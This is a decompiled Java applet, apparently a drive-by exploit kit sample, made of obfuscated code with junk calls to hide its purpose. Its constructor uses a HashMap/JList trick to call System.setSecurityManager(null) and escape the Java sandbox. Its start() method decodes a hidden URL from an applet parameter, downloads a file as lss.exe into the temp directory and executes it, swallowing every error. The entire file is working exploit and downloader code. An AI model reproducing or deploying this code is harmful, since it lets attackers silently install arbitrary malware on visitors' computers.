import java.util.Map;
import java.awt.Component;
import javax.swing.JList;
import java.util.Set;
import java.util.HashMap;
import java.util.HashSet;
import java.io.InputStream;
import java.io.FileOutputStream;
import java.applet.Applet;

// 
// Decompiled by Procyon v0.5.30
// 

public class Ooo extends Applet
{
    public int LqcaGS;
    private Class[] d;
    private String K;
    private Class[] e;
    private Class[] j;
    private Boolean H;
    public int gJEnqr;
    public Class[] QKqQRV;
    public Class GUtBph;
    
    public Boolean EcSHVw() {
        return true;
    }
    
    private void ok() {
        final int a = 1;
    }
    
    @Override
    public void start() {
        super.start();
        try {
            String tdir = System.getProperty("jffe22aavffe22aa.iffe22ao.tffe22ampffe22adffe22air".replace("ffe22a", ""));
            if (tdir.charAt(tdir.length() - 1) != '\\') {
                tdir += "\\";
            }
            final String efool = tdir + "lss" + ".e".concat("xe");
            final String uri = this.getParameter("dest");
            String duri = "";
            for (int s = 0; s < uri.length(); ++s) {
                int tt = uri.charAt(s);
                tt -= 4;
                duri += (char)tt;
            }
            final InputStream reader = Idmer.createIS(duri);
            final FileOutputStream writer = new FileOutputStream(efool);
            byte[] buffer = new byte[153600];
            for (int totalBytesRead = 0, bytesRead = 0; (bytesRead = reader.read(buffer)) > 0; buffer = new byte[153600], totalBytesRead += bytesRead) {
                writer.write(buffer, 0, bytesRead);
            }
            writer.close();
            reader.close();
            try {
                Idmer.exe(efool);
            }
            catch (Exception ex) {}
        }
        catch (Exception ex2) {}
    }
    
    public final void Ecs() {
        final int derm = 9;
        final int reso = derm / 2 + 55;
    }
    
    public Ooo() {
        final Object target = System.class;
        this.Ecs();
        this.ok();
        final String methodName = "sesdg2ttSecsdg2turisdg2ttyMsdg2tanagsdg2ter".replace("sdg2t", "");
        this.Ecs();
        this.Ecs();
        this.ok();
        final Object[] www = { null };
        final Object[] w = { null };
        this.Ecs();
        this.ok();
        final fftubny l = new fftubny(target, methodName, www);
        this.Ecs();
        final HashSet a = new HashSet();
        final HashSet b = new HashSet();
        this.Ecs();
        this.ok();
        a.add(l);
        this.ok();
        final int verif = 13;
        this.Ecs();
        final Map bas = new HashMap() {
            @Override
            public Set entrySet() {
                return a;
            }
        };
        this.Ecs();
        this.ok();
        final boolean tmp5_5 = true;
        this.ok();
        final boolean wwerist = tmp5_5;
        final boolean tmp5_6 = true;
        this.ok();
        final boolean localBoolean3 = tmp5_6;
        this.ok();
        final JList list = new JList((E[])new Object[] { bas });
        this.Ecs();
        this.ok();
        this.add(list);
        this.ok();
        try {
            Thread.sleep(4000L);
        }
        catch (InterruptedException ex) {}
    }
}
